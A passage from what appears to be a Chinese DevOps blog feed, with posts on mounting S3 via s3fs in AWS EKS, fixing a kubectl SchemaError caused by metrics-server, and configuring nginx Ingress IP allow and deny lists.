</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&gt;&gt;&gt; Building new image'</span></span><br><span class="line">docker build --no-cache=<span class="literal">true</span> -t <span class="variable">$REPOSITORY</span>/<span class="variable">$PROJECT</span>:<span class="variable">$VERSION</span> . | tee /tmp/docker_build_result.log</span><br><span class="line">RESULT=$(cat /tmp/docker_build_result.log | tail -n 1)</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$RESULT</span>"</span> != *Successfully* ]];</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&gt;&gt;&gt; Push new image'</span></span><br><span class="line">docker push <span class="variable">$REPOSITORY</span>/<span class="variable">$PROJECT</span>:<span class="variable">$VERSION</span></span><br><span class="line"></span><br><span class="line">kubectl apply -f ./yaml/configmap_secrets.yaml</span><br><span class="line"><span class="comment"># Apply the YAML passed into stdin and replace the version string first</span></span><br><span class="line"><span class="comment">#cat ./yaml/daemonset.yaml | sed "s/$REPOSITORY\/$PROJECT/$REPOSITORY\/$PROJECT:$VERSION/g" | kubectl apply -f -</span></span><br></pre></td></tr></table></figure><p>3.4 修改 docker-entrypoint.sh</p><p>经过测试，当需要把另一个存储桶挂载到集群中以替换<code>test-backut</code>存储桶时，会报错<code>HTTP response code 403, returning EPERM.</code> 根据错误google查找时可能有人会告诉你添加<code>-o url=https://s3-us-west-1.amazonaws.com</code>参数可以解决问题（s3-us-west-1是你AWS所在区域），但在我的环境中并没有得到解决，需要修改<code>docker-entrypoint.sh</code>文件添加<code>-o passwd_file=&quot;/etc/passwd-s3fs&quot;</code>参数明确指定IAM key文件位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/s3fs <span class="variable">$&#123;S3_BUCKET&#125;</span> <span class="variable">$&#123;MNT_POINT&#125;</span> -d -d -f -o passwd_file=<span class="string">"/etc/passwd-s3fs"</span> -o endpoint=<span class="variable">$&#123;S3_REGION&#125;</span>,allow_other,retries=5</span><br></pre></td></tr></table></figure><p>3.5 构建镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./build.sh v1.0</span></span><br></pre></td></tr></table></figure><h3 id="4-部署"><a href="#4-部署" class="headerlink" title="4.部署"></a>4.部署</h3><p>我这里将构建和部署分开了，部署的时候需要修改<code>yaml/daemonset.yaml</code>文件中的镜像名称</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat yaml/daemonset.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">s3-provider</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">s3-provider</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    matchLabels:</span></span><br><span class="line"><span class="attr">      app:</span> <span class="string">s3-provider</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">s3-provider</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">      - name:</span> <span class="string">s3fuse</span></span><br><span class="line"><span class="attr">        image:</span> <span class="string">docker.chenzz.local/public/kube-s3:v1.0</span></span><br><span class="line"><span class="attr">        lifecycle:</span></span><br><span class="line"><span class="attr">          preStop:</span></span><br><span class="line"><span class="attr">            exec:</span></span><br><span class="line"><span class="attr">              command:</span> <span class="string">["/bin/sh","-c","umount</span> <span class="bullet">-f</span> <span class="string">/var/s3"]</span></span><br><span class="line"><span class="attr">        securityContext:</span></span><br><span class="line"><span class="attr">          privileged:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">          capabilities:</span></span><br><span class="line"><span class="attr">            add:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">        <span class="comment"># use ALL  entries in the config map as environment variables</span></span><br><span class="line"><span class="attr">        envFrom:</span></span><br><span class="line"><span class="attr">        - configMapRef:</span></span><br><span class="line"><span class="attr">            name:</span> <span class="string">s3-config</span></span><br><span class="line"><span class="attr">        volumeMounts:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">devfuse</span></span><br><span class="line"><span class="attr">          mountPath:</span> <span class="string">/dev/fuse</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">mntdatas3fs</span></span><br><span class="line"><span class="attr">          mountPath:</span> <span class="string">/var/s3:shared</span></span><br><span class="line"><span class="attr">      volumes:</span></span><br><span class="line"><span class="attr">      - name:</span> <span class="string">devfuse</span></span><br><span class="line"><span class="attr">        hostPath:</span></span><br><span class="line"><span class="attr">          path:</span> <span class="string">/dev/fuse</span></span><br><span class="line"><span class="attr">      - name:</span> <span class="string">mntdatas3fs</span></span><br><span class="line"><span class="attr">        hostPath:</span></span><br><span class="line"><span class="attr">          path:</span> <span class="string">/mnt/data-s3-fs</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kubectl apply -f yaml/daemonset.yaml</span></span><br></pre></td></tr></table></figure><p>检查pod是否正常运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kubectl get pod |grep s3</span></span><br><span class="line">s3-provider-4h2bv                   1/1     Running   0          17m</span><br><span class="line">s3-provider-6k28f                   1/1     Running   0          17m</span><br><span class="line">s3-provider-75vln                   1/1     Running   0          17m</span><br><span class="line">s3-provider-b5qzv                   1/1     Running   0          17m</span><br><span class="line">s3-provider-c5lk4                   1/1     Running   0          17m</span><br></pre></td></tr></table></figure><p>也可以去任意node节点查看S3fs挂载情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># df -hT|egrep -v "tmpfs|overlay"</span></span><br><span class="line">Filesystem             Type       Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/nvme0n1p1         xfs         20G   11G  9.6G  52% /</span><br><span class="line">s3fs                   fuse.s3fs  256T     0  256T   0% /mnt/data-s3-fs</span><br></pre></td></tr></table></figure><p>S3fs已经挂载到了<code>/mnt/data-s3-fs</code>目录</p><p><code>注：</code>如果在配置和挂载过程中遇到问题，可以使用docker方式运行进行调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker run -it --name=s3 --cap-add SYS_ADMIN --device /dev/fuse -v /mnt/data-s3-fs:/var/s3:shared docker.chenzz.local/public/kube-s3:v1.0 /bin/bash</span></span><br></pre></td></tr></table></figure><p>进入容器声明挂载所需参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export AWS_KEY=***********</span></span><br><span class="line"><span class="comment"># export AWS_SECRET_KEY=************</span></span><br><span class="line"><span class="comment"># export S3_BUCKET='test-backut'</span></span><br><span class="line"><span class="comment"># export AWSACCESSKEYID=$&#123;AWSACCESSKEYID:-$AWS_KEY&#125;</span></span><br><span class="line"><span class="comment"># export AWSSECRETACCESSKEY=$&#123;AWSSECRETACCESSKEY:-$AWS_SECRET_KEY&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo "$&#123;AWS_KEY&#125;:$&#123;AWS_SECRET_KEY&#125;" &gt; /etc/passwd-s3fs</span></span><br><span class="line"><span class="comment"># chmod 0400 /etc/passwd-s3fs</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/bin/s3fs $&#123;S3_BUCKET&#125; $&#123;MNT_POINT&#125; -d -d -f -o f2 -o passwd_file=/etc/passwd-s3fs,allow_other,retries=5</span></span><br></pre></td></tr></table></figure><h3 id="5-验证S3fs"><a href="#5-验证S3fs" class="headerlink" title="5.验证S3fs"></a>5.验证S3fs</h3><p>创建demo pod来验证S3fs是否可以正常工作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kubectl apply -f yaml/example_pod.yaml</span></span><br><span class="line"><span class="comment"># kubectl get pod |grep test</span></span><br><span class="line"><span class="built_in">test</span>-pd                              1/1     Running   0          15m</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kubectl exec -ti test-pd sh</span></span><br><span class="line"><span class="comment"># df -hT</span></span><br><span class="line">Filesystem     Type       Size  Used Avail Use% Mounted on</span><br><span class="line">overlay        overlay    100G  5.3G   95G   6% /</span><br><span class="line">tmpfs          tmpfs       64M     0   64M   0% /dev</span><br><span class="line">tmpfs          tmpfs      7.8G     0  7.8G   0% /sys/fs/cgroup</span><br><span class="line">s3fs           fuse.s3fs  256T     0  256T   0% /var/s3</span><br><span class="line">/dev/nvme0n1p1 xfs        100G  5.3G   95G   6% /etc/hosts</span><br><span class="line">shm            tmpfs       64M     0   64M   0% /dev/shm</span><br><span class="line">tmpfs          tmpfs      7.8G   12K  7.8G   1% /run/secrets/kubernetes.io/serviceaccount</span><br></pre></td></tr></table></figure><p>S3fs挂载到了pod中的<code>/var/s3</code>目录下，下面来创建文件测试S3fs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dd if=/dev/zero of=/var/s3/data1/test1G-3 bs=1M count=1000</span></span><br><span class="line">1000+0 records <span class="keyword">in</span></span><br><span class="line">1000+0 records out</span><br><span class="line">1048576000 bytes (1.0 GB) copied, 8.80683 s, 119 MB/s</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd if=/dev/zero of=/var/s3/data1/test4G-3 bs=1M count=4000</span></span><br><span class="line">4000+0 records <span class="keyword">in</span></span><br><span class="line">4000+0 records out</span><br><span class="line">4194304000 bytes (4.2 GB) copied, 63.0417 s, 66.5 MB/s</span><br></pre></td></tr></table></figure><p>因为k8s运行在AWS，所以挂载S3fs可以得到不错的写入速度，至于AWS之外的环境就没有做测试了，感兴趣的朋友可以测试一下</p><p>然后去S3页面查看文件是否存在</p><p><img src="/2021/08/11/eks-gua-zai-s3fs-wen-jian-xi-tong/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><h2 id="S3fs-的不足"><a href="#S3fs-的不足" class="headerlink" title="S3fs 的不足"></a>S3fs 的不足</h2><p>通常，S3 无法提供与本地文件系统相同的性能或语义。进一步来说：</p><ul><li>随机写入或附加到文件需要重写整个对象，优化多部分上传副本</li><li>由于网络延迟，元数据操作（例如列出目录）性能不佳</li><li>非 AWS 提供商可能具有<a href="https://en.wikipedia.org/wiki/Eventual_consistency" target="_blank" rel="noopener">最终一致性，</a>因此读取可以暂时产生陈旧数据（AWS<a href="https://aws.amazon.com/about-aws/whats-new/2020/12/amazon-s3-now-delivers-strong-read-after-write-consistency-automatically-for-all-applications/" target="_blank" rel="noopener">自 2020 年 12 月起</a>提供先写后读一致性）</li><li>没有文件或目录的原子重命名</li><li>安装同一个存储桶的多个客户端之间没有协调</li><li>没有硬链接</li><li>inotify 仅检测本地修改，而不检测其他客户端或工具的外部修改</li></ul><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于原来使
      
    
    </summary>
    
    
      <category term="kubernetes" scheme="http://chenzhonzhou.github.io/categories/kubernetes/"/>
    
    
      <category term="kubernetes - S3" scheme="http://chenzhonzhou.github.io/tags/kubernetes-S3/"/>
    
  </entry>
  
  <entry>
    <title>kubectl edit 或者 apply 报 SchemaError 错误</title>
    <link href="http://chenzhonzhou.github.io/2021/07/13/kubectl-edit-huo-zhe-apply-bao-schemaerror-cuo-wu/"/>
    <id>http://chenzhonzhou.github.io/2021/07/13/kubectl-edit-huo-zhe-apply-bao-schemaerror-cuo-wu/</id>
    <published>2021-07-13T07:51:23.000Z</published>
    <updated>2021-07-13T10:48:05.255Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:50 GMT+0800 (GMT+08:00) --><h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>kubectl edit 或 apply 资源报如下错误:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: SchemaError(io.k8s.apimachinery.pkg.apis.meta.v1.APIGroup_v2): invalid object doesn<span class="string">'t have additional properties</span></span><br></pre></td></tr></table></figure><p>集群版本：v1.10</p><p>该问题网上已经有人遇到并解决，文末附原文地址</p><h2 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h2><ol><li><p>使用 <code>kubectl apply -f tmp.yaml --dry-run -v8</code> 发现请求 <code>/openapi/v2</code> 这个 api 之后，kubectl在 validate 过程报错。</p></li><li><p>换成 kubectl 1.12 之后没有再报错。</p></li><li><p><code>kubectl get --raw &#39;/openapi/v2&#39;</code> 发现返回的 json 内容与正常集群有差异，刚开始返回的 json title 为 <code>Kubernetes metrics-server</code>，正常的是 Kubernetes。</p></li><li><p>怀疑是 <code>metrics-server</code> 的问题，发现集群内确实安装了 k8s 官方的 <code>metrics-server</code>，询问得知之前是 0.3.1，后面升级为了 0.3.5。</p></li><li><p>将 metrics-server 回滚之后恢复正常。</p><p>metrics-server使用的镜像是：k8s.gcr.io/metrics-server-amd64:v0.3.2，国内下载失败可以转储到dockerhub等公有或自己的私有镜像仓库，或者使用我这个转储的镜像：chenzz/metrics-server-amd64:v0.3.1</p></li></ol><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>初步怀疑，新版本的 metrics-server 使用了新的 openapi-generator，生成的 openapi 格式和之前 k8s 版本生成的有差异。导致旧版本的 kubectl 在解析 openapi 的 schema 时发生异常，查看代码发现1.10 和 1.12 版本在解析 openapi 的 schema 时，实现确实有差异。</p><p>原文地址：<a href="https://k8s.imroc.io/avoid/cases/schemaerror-when-using-kubectl-apply-or-edit/" target="_blank" rel="noopener">https://k8s.imroc.io/avoid/cases/schemaerror-when-using-kubectl-apply-or-edit/</a></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:50 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;问题现象&quot;&gt;&lt;a href=&quot;#问题现象&quot; class=&quot;headerlink&quot; title=&quot;问题现象&quot;&gt;&lt;/a&gt;问题现象&lt;/h2&gt;
      
    
    </summary>
    
    
      <category term="kubernetes" scheme="http://chenzhonzhou.github.io/categories/kubernetes/"/>
    
    
      <category term="kubernetes" scheme="http://chenzhonzhou.github.io/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>k8s Ingress 配置黑白名单</title>
    <link href="http://chenzhonzhou.github.io/2021/06/28/k8s-ingress-pei-zhi-hei-bai-ming-dan/"/>
    <id>http://chenzhonzhou.github.io/2021/06/28/k8s-ingress-pei-zhi-hei-bai-ming-dan/</id>
    <published>2021-06-28T03:51:28.000Z</published>
    <updated>2021-07-01T07:03:03.224Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:50 GMT+0800 (GMT+08:00) --><h2 id="一、黑白名单用途"><a href="#一、黑白名单用途" class="headerlink" title="一、黑白名单用途"></a>一、黑白名单用途</h2><p>黑名单能<code>有效防止某个IP恶意攻击</code>或者<code>拒绝特定IP</code>的访问（黑名单以外的<strong>IP</strong>都能通过）；白名单则只允许特定<strong>IP</strong>的访问（白名单以外的<strong>IP</strong>都不能通过）。</p><h2 id="二、Ingress黑白名单配置"><a href="#二、Ingress黑白名单配置" class="headerlink" title="二、Ingress黑白名单配置"></a>二、Ingress黑白名单配置</h2><p>Ingress部署可以参考我之前的文章进行配置 <a href="https://chenzhonzhou.github.io/2021/05/27/eks-ingress-alb-ru-he-tu-po-bai-ming-dan-shu-liang-xian-zhi/#more">EKS Ingress+ALB如何突破白名单数量限制？</a></p><h3 id="2-1-配置黑名单"><a href="#2-1-配置黑名单" class="headerlink" title="2.1 配置黑名单"></a>2.1 配置黑名单</h3><p><strong>ingress 配置</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">nginx.qa.service.com</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">kubernetes.io/ingress.class:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/server-snippet:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      set_real_ip_from 10.0.0.0/8; #上一级代理的IP地址或者IP段,可以写多行。</span></span><br><span class="line"><span class="string">      real_ip_header X-Forwarded-For; #从哪个header头检索出需要的IP地址。</span></span><br><span class="line"><span class="string">      real_ip_recursive on; #递归的去除所配置中的可信IP。</span></span><br><span class="line"><span class="string">      access_log /var/log/nginx/nginx.access.log upstreaminfo;</span></span><br><span class="line"><span class="string">      deny 192.168.208.88;</span></span><br><span class="line"><span class="string">      allow all;</span></span><br><span class="line"><span class="string"></span><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">    - host:</span> <span class="string">nginx.qa.service.com</span></span><br><span class="line"><span class="attr">      http:</span></span><br><span class="line"><span class="attr">        paths:</span></span><br><span class="line"><span class="attr">          - backend:</span></span><br><span class="line"><span class="attr">              serviceName:</span> <span class="string">nginx-service</span></span><br><span class="line"><span class="attr">              servicePort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><ul><li>nginx.ingress.kubernetes.io/server-snippet：在nginx 的 server 配置块中添加自定义配置；</li><li>nginx.ingress.kubernetes.io/whitelist-source-range：允许的客户端IP源范围，该值是逗号分隔的<a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing" target="_blank" rel="noopener">CIDR</a>列表，例如<code>10.0.0.0/24,172.10.0.1</code>。</li></ul><p><strong>测试白名单</strong></p><p>在 <code>192.168.208.88</code> 这台电脑上访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -Ik http://nginx.qa.service.com</span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">Date: Thu, 28 Jun 2021 06:07:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 153</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Server: nginx/1.17.8</span><br></pre></td></tr></table></figure><h3 id="2-2-配置白名单"><a href="#2-2-配置白名单" class="headerlink" title="2.2 配置白名单"></a>2.2 配置白名单</h3><p><strong>ingress 配置</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">nginx2.qa.service.com</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">kubernetes.io/ingress.class:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/server-snippet:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      set_real_ip_from 10.0.0.0/8; #上一级代理的IP地址或者IP段,可以写多行。</span></span><br><span class="line"><span class="string">      real_ip_header X-Forwarded-For; #从哪个header头检索出需要的IP地址。</span></span><br><span class="line"><span class="string">      real_ip_recursive on; #递归的去除所配置中的可信IP。</span></span><br><span class="line"><span class="string">      access_log /var/log/nginx/nginx2.access.log upstreaminfo;</span></span><br><span class="line"><span class="string">    nginx.ingress.kubernetes.io/whitelist-source-range: 192.168.208.88/32</span></span><br><span class="line"><span class="string"></span><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">    - host:</span> <span class="string">nginx2.qa.service.com</span></span><br><span class="line"><span class="attr">      http:</span></span><br><span class="line"><span class="attr">        paths:</span></span><br><span class="line"><span class="attr">          - backend:</span></span><br><span class="line"><span class="attr">              serviceName:</span> <span class="string">nginx-service</span></span><br><span class="line"><span class="attr">              servicePort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p><strong>测试白名单</strong></p><p>在 <code>192.168.208.88</code> 这台电脑上访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ curl -Ik http://nginx2.qa.service.com</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 28 Jun 2021 06:20:43 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1241</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Server: nginx/1.17.8</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Last-Modified: Thu, 10 Jun 2021 09:39:53 GMT</span><br><span class="line">ETag: <span class="string">"60c1dde9-4d9"</span></span><br><span class="line">Cache-Control: no-store, no-cache, private</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure><p><strong>全局白名单配置</strong></p><p>配置 <code>ingress</code> 的 <code>configmap</code> 配置 <code>nginx-configuration</code></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">kind</span>: ConfigMap</span><br><span class="line"><span class="attribute">apiVersion</span>: v1</span><br><span class="line"><span class="attribute">metadata</span>:</span><br><span class="line">  <span class="attribute">name</span>: nginx-configuration</span><br><span class="line">  <span class="attribute">namespace</span>: gray-<span class="number">01</span></span><br><span class="line">  <span class="attribute">labels</span>:</span><br><span class="line">    app.kubernetes.io/<span class="attribute">name</span>: ingress-nginx</span><br><span class="line">    app.kubernetes.io/<span class="attribute">part-of</span>: ingress-nginx</span><br><span class="line"><span class="attribute">data</span>:</span><br><span class="line">  <span class="attribute">whitelist-source-range</span>: <span class="number">192.168</span>.<span class="number">208.1</span>/<span class="number">24</span></span><br><span class="line">  <span class="attribute">block-cidrs</span>: <span class="number">192.168</span>.<span class="number">208.1</span></span><br></pre></td></tr></table></figure><p>该配置对所在 <code>namespace</code> 下的所有 <code>ingress</code> 都生效，实际使用则非常少见，了解就行了</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:50 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;一、黑白名单用途&quot;&gt;&lt;a href=&quot;#一、黑白名单用途&quot; class=&quot;headerlink&quot; title=&quot;一、黑白名单用途&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="kubernetes" scheme="http://chenzhonzhou.github.io/categories/kubernetes/"/>
    
    
      <category term="kubernetes - Ingress" scheme="http://chenzhonzhou.github.io/tags/kubernetes-Ingress/"/>
    
  </entry>
  
  <entry>
    <title>EKS Ingress+ALB如何突破白名单数量限制？</title>
    <link href="http://chenzhonzhou.github.io/2021/05/27/eks-ingress-alb-ru-he-tu-po-bai-ming-dan-shu-liang-xian-zhi/"/>
    <id>http://chenzhonzhou.github.io/2021/05/27/eks-ingress-alb-ru-he-tu-po-bai-ming-dan-shu-liang-xian-zhi/</id>
    <published>2021-05-27T09:06:53.000Z</published>
    <updated>2021-07-08T02:06:47.310Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>继上篇文章所言，我们在AWS EKS中使用 Ingress+ALB 对外暴露服务，在上篇文章中我测试了Ingress+NLB方案并取得了成功，但对当前环境改动较大（修改DNS解析、域名和服务的绑定全部都要切到新Ingress上）最终还是作为备选方案。</p><h2 id="二、方案思考"><a href="#二、方案思考" class="headerlink" title="二、方案思考"></a>二、方案思考</h2><p>虽然 Ingress+NLB 方案只能作为备选，但我们团队也提出了其它方案的思考：</p><ul><li>ALB是否支持插件，这样我们只需要在插件中配置白名单，如果是允许的来源IP就返回给ALB放行；</li><li>AWS WAF是一项Web应用程序防火墙服务，可以调研下看看是否可以用在当前环境；</li></ul><p>带着这样两个问题，又重新翻阅了AWS的<a href="https://aws.amazon.com/cn/elasticloadbalancing/application-load-balancer/?nc1=h_ls" target="_blank" rel="noopener">文档</a>，然而并没有找到ALB是否支持插件的相关说明；于是将目标转向了<a href="https://console.aws.amazon.com/wafv2/homev2/start?region=ap-southeast-2" target="_blank" rel="noopener">AWS WAF</a>服务，在对WAF服务进行测试中发现WAF只能绑定ALB并不支持ALB后端的虚拟主机（规则），在来看看AWS WAF服务功能说明：<code>AWS WAF是一项Web应用程序防火墙服务，可让您监视转发到Amazon API Gateway API，Amazon CloudFront发行版或应用程序负载均衡器的Web请求。您可以根据指定的条件（例如，请求源的IP地址）来保护那些资源。</code> WAF这个服务可以看作是Web应用程序防火墙，它位于ALB等资源的前端，可以用它来保护我们的API Gateway、ALB、AWS 